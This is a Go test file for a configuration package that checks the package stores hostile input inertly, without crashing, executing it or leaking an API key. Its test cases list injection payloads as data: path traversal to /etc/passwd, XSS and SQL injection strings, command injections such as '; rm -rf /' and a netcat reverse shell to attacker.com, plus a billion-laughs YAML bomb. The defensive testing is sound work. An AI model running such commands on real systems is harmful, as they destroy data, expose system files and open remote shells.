// internal/config/morph_security_test.go
package config

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// =============================================================================
// Security-Related Tests
// =============================================================================

func TestAPIKeyNotLoggedInError(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Morph.APIKey = "secret-api-key-12345"
	cfg.Morph.VM.VCPUs = 0 // Invalid

	err := cfg.Validate()
	if err == nil {
		t.Fatal("Expected validation error")
	}

	// Error message should NOT contain the API key
	if strings.Contains(err.Error(), "secret-api-key-12345") {
		t.Error("Error message should not contain API key")
	}
}

func TestPathTraversalInAgentBrowserPath(t *testing.T) {
	cfg := DefaultConfig()

	// Various path traversal attempts
	paths := []string{
		"../../../etc/passwd",
		"/etc/passwd",
		"..\\..\\..\\windows\\system32",
		"/tmp/../etc/passwd",
		"./../../secret",
		"~/../../../etc/passwd",
	}

	for _, path := range paths {
		t.Run(path, func(t *testing.T) {
			cfg.AgentBrowser.Path = path
			// Should be able to set (validation is at usage time)
			// but this tests that the config package doesn't crash
			if cfg.AgentBrowser.Path != path {
				t.Errorf("Path = %s, want %s", cfg.AgentBrowser.Path, path)
			}
		})
	}
}

func TestXSSInAPIKey(t *testing.T) {
	cfg := DefaultConfig()

	xssPayloads := []string{
		"<script>alert('xss')</script>",
		"<img src=x onerror=alert('xss')>",
		"javascript:alert('xss')",
		"<svg onload=alert('xss')>",
		"';alert('xss');//",
	}

	for _, payload := range xssPayloads {
		t.Run("xss", func(t *testing.T) {
			cfg.Morph.APIKey = payload
			got := cfg.GetMorphAPIKey()
			// Should return the value as-is (no processing)
			if got != payload {
				t.Errorf("GetMorphAPIKey() = %s, want %s", got, payload)
			}
		})
	}
}

func TestSQLInjectionInAPIKey(t *testing.T) {
	cfg := DefaultConfig()

	sqlPayloads := []string{
		"'; DROP TABLE users; --",
		"1' OR '1'='1",
		"admin'--",
		"1; SELECT * FROM secrets",
		"UNION SELECT password FROM users",
	}

	for _, payload := range sqlPayloads {
		t.Run("sql", func(t *testing.T) {
			cfg.Morph.APIKey = payload
			got := cfg.GetMorphAPIKey()
			// Should return the value as-is (no processing)
			if got != payload {
				t.Errorf("GetMorphAPIKey() = %s, want %s", got, payload)
			}
		})
	}
}

func TestCommandInjectionInPath(t *testing.T) {
	cfg := DefaultConfig()

	cmdPayloads := []string{
		"; rm -rf /",
		"| cat /etc/passwd",
		"&& cat /etc/passwd",
		"`cat /etc/passwd`",
		"$(cat /etc/passwd)",
		"\n cat /etc/passwd",
		"; nc attacker.com 4444 -e /bin/sh",
	}

	for _, payload := range cmdPayloads {
		t.Run("cmd", func(t *testing.T) {
			cfg.AgentBrowser.Path = payload
			// Should store but not execute
			if cfg.AgentBrowser.Path != payload {
				t.Errorf("Path = %s, want %s", cfg.AgentBrowser.Path, payload)
			}
		})
	}
}

func TestEnvVarInjection(t *testing.T) {
	// Test that env var syntax doesn't cause unexpected behavior
	cfg := DefaultConfig()

	injectionPayloads := []string{
		"${PATH}",
		"${HOME}",
		"${SHELL}",
		"${USER}",
		"$(whoami)",
		"`id`",
		"$((7*6))",
		"${IFS}",
	}

	for _, payload := range injectionPayloads {
		name := payload
		if len(name) > 10 {
			name = name[:10]
		}
		t.Run("env_"+name, func(t *testing.T) {
			cfg.Morph.APIKey = payload
			got := cfg.GetMorphAPIKey()
			// Behavior depends on implementation - just verify no panic
			t.Logf("Input: %q, Output: %q", payload, got)
		})
	}
}

func TestLargeInputDoS(t *testing.T) {
	cfg := DefaultConfig()

	// Very large input that could cause DoS
	largeInput := strings.Repeat("A", 100*1024*1024) // 100MB

	cfg.Morph.APIKey = largeInput
	got := cfg.GetMorphAPIKey()

	if len(got) != len(largeInput) {
		t.Errorf("Large input length = %d, want %d", len(got), len(largeInput))
	}
}

func TestNullByteInjection(t *testing.T) {
	cfg := DefaultConfig()

	nullPayloads := []string{
		"key\x00evil",
		"\x00",
		"normal\x00",
		"\x00\x00\x00",
		"before\x00after",
	}

	for _, payload := range nullPayloads {
		t.Run("null", func(t *testing.T) {
			cfg.Morph.APIKey = payload
			got := cfg.GetMorphAPIKey()
			if got != payload {
				t.Errorf("GetMorphAPIKey() = %q, want %q", got, payload)
			}
		})
	}
}

// =============================================================================
// Sensitive Data Handling Tests
// =============================================================================

func TestAPIKeyFromEnvNotInConfig(t *testing.T) {
	os.Setenv("SECRET_API_KEY", "super-secret-key")
	defer os.Unsetenv("SECRET_API_KEY")

	cfg := DefaultConfig()
	cfg.Morph.APIKey = "${SECRET_API_KEY}"

	// The config value should be the reference, not the actual key
	if cfg.Morph.APIKey != "${SECRET_API_KEY}" {
		t.Error("Config should store the env var reference, not the value")
	}

	// GetMorphAPIKey should resolve it
	got := cfg.GetMorphAPIKey()
	if got != "super-secret-key" {
		t.Errorf("GetMorphAPIKey() = %s, want super-secret-key", got)
	}
}

func TestBaseSnapshotIDFromEnvNotInConfig(t *testing.T) {
	os.Setenv("DBA_BASE_SNAPSHOT", "secret-snapshot-id")
	defer os.Unsetenv("DBA_BASE_SNAPSHOT")

	cfg := DefaultConfig()
	// DefaultConfig now has a default snapshot ID, so it takes precedence
	// First verify the default value
	got := cfg.GetBaseSnapshotID()
	if got != "snapshot_3namut0l" {
		t.Errorf("GetBaseSnapshotID() = %s, want snapshot_3namut0l (default)", got)
	}

	// To test env var fallback, clear the config value
	cfg.Morph.BaseSnapshotID = ""
	got = cfg.GetBaseSnapshotID()
	if got != "secret-snapshot-id" {
		t.Errorf("GetBaseSnapshotID() with empty config = %s, want secret-snapshot-id", got)
	}
}

// =============================================================================
// YAML Security Tests
// =============================================================================

func TestYAMLBombPrevention(t *testing.T) {
	tmpDir := t.TempDir()
	os.Setenv("DBA_HOME", tmpDir)
	defer os.Unsetenv("DBA_HOME")

	// YAML bomb (billion laughs attack)
	yamlBomb := `
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
`
	if err := os.WriteFile(filepath.Join(tmpDir, "config.yaml"), []byte(yamlBomb), 0644); err != nil {
		t.Fatal(err)
	}

	// Should either handle safely or error - not hang/crash
	_, err := Load()
	t.Logf("YAML bomb result: err=%v", err)
}

func TestYAMLAliasAbuse(t *testing.T) {
	tmpDir := t.TempDir()
	os.Setenv("DBA_HOME", tmpDir)
	defer os.Unsetenv("DBA_HOME")

	// Abusive alias usage
	content := `
morph:
  api_key: &key "shared-key"
  base_snapshot_id: *key
`
	if err := os.WriteFile(filepath.Join(tmpDir, "config.yaml"), []byte(content), 0644); err != nil {
		t.Fatal(err)
	}

	cfg, err := Load()
	if err != nil {
		t.Fatalf("Load() error: %v", err)
	}

	// Both should have the same value
	if cfg.Morph.APIKey != cfg.Morph.BaseSnapshotID {
		t.Logf("APIKey = %q, BaseSnapshotID = %q", cfg.Morph.APIKey, cfg.Morph.BaseSnapshotID)
	}
}

// =============================================================================
// Config File Permission Tests
// =============================================================================

func TestConfigFilePermissions(t *testing.T) {
	tmpDir := t.TempDir()
	os.Setenv("DBA_HOME", tmpDir)
	defer os.Unsetenv("DBA_HOME")

	content := `
morph:
  api_key: "permission-test"
`
	configPath := filepath.Join(tmpDir, "config.yaml")

	// Test various permissions
	permissions := []os.FileMode{0644, 0600, 0400, 0444}

	for _, perm := range permissions {
		t.Run(perm.String(), func(t *testing.T) {
			if err := os.WriteFile(configPath, []byte(content), perm); err != nil {
				t.Fatal(err)
			}

			cfg, err := Load()
			if err != nil {
				t.Logf("Load() with permission %s: err=%v", perm, err)
			} else {
				if cfg.Morph.APIKey != "permission-test" {
					t.Errorf("APIKey = %s, want permission-test", cfg.Morph.APIKey)
				}
			}
		})
	}
}

// =============================================================================
// Input Validation Tests
// =============================================================================

func TestSessionPrefixValidation(t *testing.T) {
	cfg := DefaultConfig()

	// Various session prefix values to test
	prefixes := []string{
		"valid-prefix",
		"a",                      // very short
		strings.Repeat("x", 256), // long
		"prefix with spaces",
		"prefix\twith\ttabs",
		"prefix\nwith\nnewlines",
		"prefix<script>",
		"prefix;drop table",
		"日本語prefix",
		"🎯prefix",
	}

	for _, prefix := range prefixes {
		t.Run(prefix[:minLen(20, len(prefix))], func(t *testing.T) {
			cfg.AgentBrowser.SessionPrefix = prefix
			// Should not crash
			if cfg.AgentBrowser.SessionPrefix != prefix {
				t.Errorf("SessionPrefix = %s, want %s", cfg.AgentBrowser.SessionPrefix, prefix)
			}
		})
	}
}

func minLen(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// =============================================================================
// Regression Tests
// =============================================================================

func TestDefaultValuesNotZero(t *testing.T) {
	// Regression: Ensure defaults are never accidentally set to zero
	if DefaultMorphVCPUs < 1 {
		t.Errorf("DefaultMorphVCPUs = %d, should be >= 1", DefaultMorphVCPUs)
	}
	if DefaultMorphMemory < 512 {
		t.Errorf("DefaultMorphMemory = %d, should be >= 512", DefaultMorphMemory)
	}
	if DefaultMorphDiskSize < 1024 {
		t.Errorf("DefaultMorphDiskSize = %d, should be >= 1024", DefaultMorphDiskSize)
	}
	if DefaultMorphTTLSeconds < 60 {
		t.Errorf("DefaultMorphTTLSeconds = %d, should be >= 60", DefaultMorphTTLSeconds)
	}
	if DefaultAgentBrowserTimeout < 1000 {
		t.Errorf("DefaultAgentBrowserTimeout = %d, should be >= 1000", DefaultAgentBrowserTimeout)
	}
}

func TestDefaultConfigFunctionsReturnNonNil(t *testing.T) {
	cfg := DefaultConfig()
	if cfg == nil {
		t.Error("DefaultConfig() returned nil")
	}

	morphCfg := DefaultMorphConfig()
	// MorphConfig is a value type, not a pointer, so can't be nil
	if morphCfg.VM.VCPUs == 0 {
		t.Error("DefaultMorphConfig().VM.VCPUs is zero")
	}

	browserCfg := DefaultAgentBrowserConfig()
	if browserCfg.Path == "" {
		t.Error("DefaultAgentBrowserConfig().Path is empty")
	}
}

func TestValidateDoesNotModifyConfig(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Morph.APIKey = "test-key"
	cfg.Morph.VM.VCPUs = 8

	originalKey := cfg.Morph.APIKey
	originalVCPUs := cfg.Morph.VM.VCPUs

	_ = cfg.Validate()

	// Config should not be modified by Validate()
	if cfg.Morph.APIKey != originalKey {
		t.Error("Validate() modified APIKey")
	}
	if cfg.Morph.VM.VCPUs != originalVCPUs {
		t.Error("Validate() modified VCPUs")
	}
}

func TestGetMorphAPIKeyDoesNotModifyConfig(t *testing.T) {
	os.Setenv("TEST_KEY", "env-value")
	defer os.Unsetenv("TEST_KEY")

	cfg := DefaultConfig()
	cfg.Morph.APIKey = "${TEST_KEY}"

	original := cfg.Morph.APIKey

	_ = cfg.GetMorphAPIKey()

	// Config should not be modified
	if cfg.Morph.APIKey != original {
		t.Error("GetMorphAPIKey() modified the config")
	}
}

func TestGetBaseSnapshotIDDoesNotModifyConfig(t *testing.T) {
	os.Setenv("DBA_BASE_SNAPSHOT", "env-snapshot")
	defer os.Unsetenv("DBA_BASE_SNAPSHOT")

	cfg := DefaultConfig()
	original := cfg.Morph.BaseSnapshotID

	_ = cfg.GetBaseSnapshotID()

	// Config should not be modified
	if cfg.Morph.BaseSnapshotID != original {
		t.Error("GetBaseSnapshotID() modified the config")
	}
}
